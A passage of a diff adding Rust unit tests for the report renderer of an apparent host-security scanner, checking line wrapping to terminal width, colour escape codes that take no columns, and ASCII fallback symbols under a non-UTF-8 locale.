+            ("MY-2", Severity::Critical),
+            ("MY-3", Severity::Medium),
+            ("MY-4", Severity::Low),
+            ("MY-5", Severity::Info),
+        ] {
+            all.push(finding(id, sev, "Another problem", "/x"));
+        }
+        let mut s = scan(all);
+        s.privileged_collectors_skipped.clear();
+        let narrow = ReportOptions {
+            columns: Some(40),
+            ..opts(false)
+        };
+        let r = render(&s, &Ignores::default(), &narrow);
+        for line in r.lines() {
+            assert!(
+                line.chars().count() <= 40,
+                "{} columns: {line:?}",
+                line.chars().count()
+            );
+        }
+        assert!(r.contains("Anyone who copies the"), "{r}");
+
+        // A wide terminal gets the same text column as a pipe, not longer lines.
+        let wide = ReportOptions {
+            columns: Some(240),
+            ..opts(false)
+        };
+        assert_eq!(wide.text_width(), TEXT_WIDTH);
+        assert_eq!(opts(false).text_width(), TEXT_WIDTH);
+        // And a tiny one stops shrinking where words would no longer fit.
+        let tiny = ReportOptions {
+            columns: Some(10),
+            ..opts(false)
+        };
+        assert_eq!(tiny.text_width(), MIN_TEXT_WIDTH);
+        // Into a pipe, a title stays on one line so it can be found with grep.
+        let piped = render(&s, &Ignores::default(), &opts(false));
+        assert!(
+            piped.contains("SSH private key is not protected by a passphrase on this computer\n"),
+            "{piped}"
+        );
+    }
+
+    /// With colour on, the footer was wrapped as if its colour codes took up columns (a command
+    /// in bold broke over three lines), and the severity word lost its padding.
+    #[test]
+    fn colour_codes_take_no_room() {
+        assert_eq!(visible_width("\x1b[1;31mHigh\x1b[0m"), 4);
+        assert_eq!(visible_width("plain"), 5);
+        let mut s = scan(vec![finding("MY-1", Severity::High, "Title", "/k/a")]);
+        s.rules_needing_admin = vec!["P1".into(), "P2".into()];
+        let colour = ReportOptions {
+            color: true,
+            columns: Some(80),
+            ..opts(false)
+        };
+        let r = render(&s, &Ignores::default(), &colour);
+        // The whole line fits in 80 columns once the codes are not counted, so it is not broken.
+        assert!(
+            r.contains("\x1b[1msudo bulwarkctl scan --privileged\x1b[0m"),
+            "{r:?}"
+        );
+        // "High" is padded to the width of the longest severity word, inside its colour.
+        assert!(r.contains("\x1b[31mHigh    \x1b[0m \x1b[1mTitle"), "{r:?}");
+        for line in r.lines() {
+            assert!(visible_width(line) <= 80, "{line:?}");
+        }
+    }
+
+    /// Under `LC_ALL=C` the bullets and arrows came out as `M-bM-^WM-^O`.
+    #[test]
+    fn a_locale_without_utf8_gets_ascii_symbols() {
+        let s = scan(vec![
+            finding("BLWK-SSH-012", Severity::High, "Key a", "/k/a"),
+            finding("BLWK-SSH-012", Severity::High, "Key b", "/k/b"),
+        ]);
+        let ascii = ReportOptions {
+            ascii: true,
+            ..opts(false)
+        };
+        let r = render(&s, &Ignores::default(), &ascii);
+        assert!(r.is_ascii(), "{r}");
+        assert!(r.contains("* High") && r.contains("x2") && r.contains("-> Add a passphrase"));
+        let clean = render(&scan(vec![]), &Ignores::default(), &ascii);
+        assert!(
+            clean.contains("ok: Nothing to fix from the checks that ran."),
+            "{clean}"
+        );
+        assert!(clean.is_ascii(), "{clean}");
     }
 }
